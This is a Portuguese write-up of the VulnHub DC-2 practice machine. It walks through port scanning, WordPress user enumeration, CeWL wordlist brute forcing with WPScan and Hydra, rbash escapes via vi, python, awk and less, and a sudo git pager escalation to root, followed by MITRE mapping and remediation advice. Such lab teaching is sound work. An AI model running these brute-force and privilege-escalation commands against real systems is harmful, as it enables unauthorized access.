# DC: 2 — Writeup (PT-BR)

> DC-2 sobe o nível da série. Esqueça um único CVE: aqui você encadeia enumeração de WordPress, wordlist gerada por CeWL, brute force, escape de shell restrito e GTFOBin via sudo. É um quebra-cabeça em múltiplas etapas que espelha como acesso inicial e movimento lateral funcionam no mundo real. Tá ligado? Bora.

---

## Informações do Alvo

| Campo | Detalhes |
|-------|---------|
| **Nível** | Iniciante |
| **VM Alvo** | DC: 2 (VirtualBox/VMware, host-only) |
| **VM Atacante** | Kali Linux 2024.x |
| **IP Alvo** | 192.168.1.101 (adaptador host-only) |
| **VulnHub URL** | https://www.vulnhub.com/entry/dc-2,311/ |
| **Técnicas** | Enumeração de usuários WordPress (WPScan), geração de wordlist (CeWL), brute force SSH (Hydra), escape de rbash via vi, GTFOBin via sudo (git) |
| **CVEs** | Nenhum CVE específico para acesso inicial; cadeia baseada em técnicas |
| **CISA KEV** | N/A para esta cadeia; técnicas alinhadas com TTPs comuns de acesso inicial de ransomware |
| **Grupos APT** | Ataques de credenciais WordPress são comuns entre afiliados de ransomware (ex.: REvil, Conti) e Initial Access Brokers (IABs) |

---

## Resumo do Ataque

```
[Atacante]
    |
    +--[ nmap -p- ]--> porta 80 (WordPress), porta 7744 (SSH)
    |
    +--[ WPScan --enumerate u ]--> usuários: admin, jerry, tom
    |
    +--[ CeWL ]--> wordlist customizada do conteúdo do site
    |
    +--[ WPScan brute force ]--> tom:parturient, jerry:adipiscing
    |
    +--[ SSH tom@:7744 ]--> rbash (shell restrito)
    |
    +--[ vi :set shell=/bin/bash :shell ]--> bash completo
    |
    +--[ sudo git help add ]--> pager abre
    |
    +--[ !/bin/bash ]--> shell root
    |
    +--[ cat /root/final-flag.txt ]--> FLAG CAPTURADA
```

---

## Metodologia

1. Descoberta de rede; identificar porta SSH não padrão 7744
2. Enumeração de usuários WordPress com WPScan
3. Gerar wordlist direcionada com CeWL; fazer brute force de credenciais
4. SSH como `tom` em shell restrito (rbash)
5. Escapar rbash via truque do editor `vi`
6. Escalar para root via GTFOBin `sudo git`

---

## Passo 1: Descoberta de Rede

**Contexto:** Scan completo de portas é obrigatório aqui porque o SSH está na porta 7744, não na 22. Ignorar isso significa perder o único caminho para um shell. Escanear tudo não é opcional, véi.

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -p- -A 192.168.1.101
```

**Saída esperada:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache 2.4.10 (Debian) - WordPress
7744/tcp open  ssh     OpenSSH 6.7p1 Debian
```

O site WordPress redireciona para `http://dc-2`. Adicione ao arquivo hosts:

```bash
echo "192.168.1.101 dc-2" | sudo tee -a /etc/hosts
```

**Nota real:** Segurança por obscuridade via portas não padrão é um obstáculo mínimo. Qualquer atacante rodando `nmap -p-` ou masscan encontra trivialmente. Defensores não devem depender de ofuscação de porta como controle de segurança.

**MITRE TTP:** T1046 - Network Service Discovery; T1595.002 - Active Scanning: Vulnerability Scanning

![Scan Nmap](images/01-nmap.png)

---

## Passo 2: Enumeração de Usuários WordPress

**Contexto:** WPScan é a ferramenta padrão para recon de WordPress. Enumeração de usuários geralmente está habilitada por padrão e expõe usernames válidos para brute force. O site também tem uma página "Flag" com uma dica para usar CeWL. Pista escancarada, mano.

```bash
wpscan --url http://dc-2 --enumerate p --enumerate t --enumerate u
```

**Saída esperada (seção relevante):**

```
[+] admin
[+] jerry
[+] tom
```

**Alternativa:** Use `curl` para acessar a API REST do WordPress:

```bash
curl http://dc-2/wp-json/wp/v2/users
```

**Nota real:** Enumeração de usuários WordPress via `/?author=1` e API REST é um vetor documentado. Em engajamentos reais, usernames enumerados alimentam diretamente campanhas de credential stuffing e brute force contra portais admin, SSH e VPNs.

**MITRE TTP:** T1589.001 - Gather Victim Identity Information: Credentials; T1590 - Gather Victim Network Information

![Enumeração WordPress](images/02-wordpress-enum.png)

---

## Passo 3: Gerar Wordlist Direcionada e Fazer Brute Force

**Contexto:** CeWL raspa um site e gera wordlist do seu conteúdo. Como autores de sites frequentemente reutilizam palavras do próprio conteúdo como senhas, wordlists direcionadas superam muito listas genéricas para este tipo de alvo. Técnica top, mano, funciona de verdade.

```bash
# Gerar wordlist direcionada
cewl http://dc-2/ > passwords.txt

# Salvar usernames enumerados
echo -e "admin\njerry\ntom" > users.txt

# Brute force via WPScan
wpscan --url http://dc-2 -U users.txt -P passwords.txt
```

**Saída esperada:**

```
[SUCCESS] Login : tom / Password : parturient
[SUCCESS] Login : jerry / Password : adipiscing
```

**Alternativa:** Use Hydra diretamente no formulário de login WordPress:

```bash
hydra -L users.txt -P passwords.txt dc-2 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

**Nota real:** Wordlists geradas pelo CeWL fazem parte de ataques reais documentados em relatórios de inteligência de ameaças. Atacantes constroem wordlists contextuais do LinkedIn, sites corporativos e vagas de emprego para atacar portais SSO e VPN corporativos.

**MITRE TTP:** T1110.001 - Brute Force: Password Guessing; T1589.001 - Gather Victim Identity Information: Credentials

![Resultados brute force WPScan](images/03-wpscan-brute.png)

---

## Passo 4: SSH como `tom` em Shell Restrito

**Contexto:** Credenciais WordPress não concedem um shell útil. SSH na porta 7744 é o caminho. `tom:parturient` funciona. Mas o shell é rbash (bash restrito): PATH limitado, sem `cat`, sem mudança de diretório fora do home. Irritante mas facilmente bypassável. rbash não é segurança de verdade, pô.

```bash
ssh tom@192.168.1.101 -p 7744
# Senha: parturient
```

**Esperado:** Prompt mostrando shell restrito. Comandos comuns falham com `rbash: command not found` ou `rbash: restricted`.

**Nota real:** Shells restritos como rbash às vezes são configurados em jump hosts ou contas de serviço com baixo privilégio. São quase universalmente bypassáveis e não devem ser tratados como fronteira de segurança. Isolamento adequado de conta requer controles no nível do SO.

**MITRE TTP:** T1078 - Valid Accounts; T1021.004 - Remote Services: SSH

---

## Passo 5: Escapar rbash via `vi`

**Contexto:** `vi` está disponível no shell restrito. O editor pode abrir um shell do sistema via comando `:shell`, bypassando rbash completamente. Esta é uma das dezenas de técnicas de escape de rbash documentadas no GTFOBins. Vacilou feio, rbash.

```bash
vi
```

Dentro do vi:

```
:set shell=/bin/bash
:shell
```

Corrigir o PATH para restaurar as ferramentas padrão:

```bash
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash
```

**Alternativas de escape rbash:**

```bash
# Via Python
python -c 'import os; os.system("/bin/bash")'

# Via awk
awk 'BEGIN {system("/bin/bash")}'

# Via less
less /etc/passwd
# depois digitar: !/bin/bash
```

**Nota real:** GTFOBins documenta dezenas de formas de escapar shells restritos usando ferramentas comumente disponíveis. Em incidentes reais, atores usam essas técnicas para sair de ambientes restritos em hosts Linux comprometidos, dispositivos IoT e equipamentos de rede.

**MITRE TTP:** T1059.004 - Command and Scripting Interpreter: Unix Shell

---

## Passo 6: Escalada de Privilégio via `sudo git`

**Contexto:** Verificar permissões sudo. `tom` pode rodar `/usr/bin/git` como root sem senha. `git help` abre um pager (geralmente `less` ou `man`). Qualquer pager aberto como root pode spawnar um shell via `!`. GTFOBin clássico, mano. Arrasou.

```bash
sudo -l
```

**Saída esperada:**

```
User tom may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

```bash
sudo git help add
```

Quando o pager abrir, digitar:

```
!/bin/bash
```

Pressionar Enter. Shell root abre.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/final-flag.txt
```

**Alternativa:** Acionar o pager via `sudo git log`:

```bash
sudo git -p log --all
!/bin/bash
```

**Nota real:** Acesso sudo irrestrito a ferramentas interativas como `git`, `vim`, `less`, `man`, `nano` e `ftp` é um caminho bem conhecido para escalada de privilégio. Em engajamentos reais de pentest, `sudo -l` é um dos primeiros comandos rodados após obter shell; misconfigurations de sudoers aparecem em aproximadamente 30-40% dos achados de pentest interno Linux.

**MITRE TTP:** T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching

![Privesc git para root](images/04-git-privesc.png)
![Flag root](images/05-root-flag.png)

---

## Flags e Credenciais Capturadas

| Item | Valor / Localização |
|------|-------------------|
| Credenciais WordPress | tom:parturient |
| Credenciais WordPress | jerry:adipiscing |
| Flag 1 | Visível na página "Flag" do WordPress |
| Flag 2 | `/home/tom/flag2.txt` (após SSH) |
| Flag 3 | `/home/jerry/flag3.txt` (requer acesso de jerry) |
| Flag Final | `/root/final-flag.txt` |

---

## Lições Aprendidas com Relevância no Mundo Real

1. **Portas não padrão são encontradas trivialmente.** SSH na 7744 não atrasa nada e não engana ninguém rodando scan completo de portas. Não dependa de ofuscação de porta como medida de segurança.

2. **CeWL é uma ferramenta de ataque legítima.** Wordlists direcionadas construídas do conteúdo do site superam rockyou.txt contra usuários reais que reutilizam palavras do site como senhas. Essa técnica está documentada em playbooks reais de APT.

3. **rbash é teatro de segurança.** Atrasa um atacante por minutos. Qualquer sistema onde rbash é uma fronteira de segurança é um sistema malconfigurado. Controle de acesso adequado significa não ter acesso interativo de login em primeiro lugar.

4. **`sudo git` NOPASSWD é equivalente a acesso root.** Qualquer ferramenta interativa que pode spawnar um shell ou pager, quando concedida sudo irrestrito, é um caminho direto para root. A auditoria de sudoers não é opcional.

5. **GTFOBins é seu melhor amigo pós-exploração.** Sempre verifique https://gtfobins.github.io/ após `sudo -l`. Cobre centenas de binários que podem ser usados para escalada de privilégio quando concedidos via sudo.

---

## Mapeamento MITRE ATT&CK

| Tática | Técnica | ID | Observações |
|--------|---------|-----|------------|
| Reconhecimento | Active Scanning | T1595.002 | Scan completo de portas nmap |
| Descoberta | Network Service Discovery | T1046 | Descoberta de porta SSH não padrão |
| Acesso a Credenciais | Brute Force: Password Guessing | T1110.001 | WPScan + wordlist CeWL |
| Acesso Inicial | Valid Accounts | T1078 | SSH com credenciais por brute force |
| Execução | Command and Scripting Interpreter: Unix Shell | T1059.004 | Escape de rbash via vi |
| Movimento Lateral | Remote Services: SSH | T1021.004 | tom@:7744 |
| Escalada de Privilégio | Abuse Elevation Control Mechanism: Sudo | T1548.003 | GTFOBin sudo git |
| Coleta | Data from Local System | T1005 | Leitura de arquivos de flags |

---

## Remediação

### Vulnerabilidade: Enumeração de Usuários WordPress + Senhas Fracas

**Funções NIST CSF 2.0:** Identify (ID.AM-2), Protect (PR.AC-1), Detect (DE.CM-7)

**Controles NIST SP 800-53:**
- AC-2: Account Management (desabilitar ou renomear conta `admin` padrão)
- IA-5: Authenticator Management (política de senha forte; implementar 2FA)
- SI-10: Information Input Validation (desabilitar enumeração de usuários via API REST do WordPress quando não necessário)

**CISA KEV:** N/A para esta cadeia específica.

**C2M2:** MIL1 - Implementar políticas de senha; MIL2 - Implantar autenticação multifator.

**D3FEND:** D3-UAP (User Account Permissions) para limitar exposição de conta; D3-PAN (Patch and Update Notification) para atualizações de plugins e temas.

---

### Vulnerabilidade: Escape de rbash + sudo git NOPASSWD

**Controles NIST SP 800-53:**
- AC-6: Least Privilege (remover NOPASSWD do sudo git; aplicar restrições mínimas de shell)
- CM-6: Configuration Settings (auditar sudoers; aplicar baseline)
- AC-17: Remote Access (restringir acesso SSH apenas a usuários necessários)

**Remediação:**

```bash
# Remover de /etc/sudoers:
# tom ALL=(root) NOPASSWD: /usr/bin/git

# Restringir SSH corretamente (somente chave, desabilitar auth por senha):
# PasswordAuthentication no  em /etc/ssh/sshd_config
```

**D3FEND:** D3-SEA (Sudo Execution Analysis); D3-EAL (Executable Allowlisting) para restringir o que usuários privilegiados podem executar.

---

## Considerações Finais

DC-2 é onde a série começa a exigir raciocínio em múltiplas etapas. Cada fase constrói sobre a anterior: recon leva à enumeração, enumeração alimenta o brute force, brute force dá acesso inicial, restrição de shell é bypassada, e uma única misconfiguration de sudo entrega o root. Essa cadeia não é teórica: espelha padrões reais de movimento lateral e escalada de privilégio documentados em relatórios de CIRT de múltiplos setores. Leve a metodologia, não só as flags, véi.

Thanks guys!! (❍ᴥ❍ʋ)
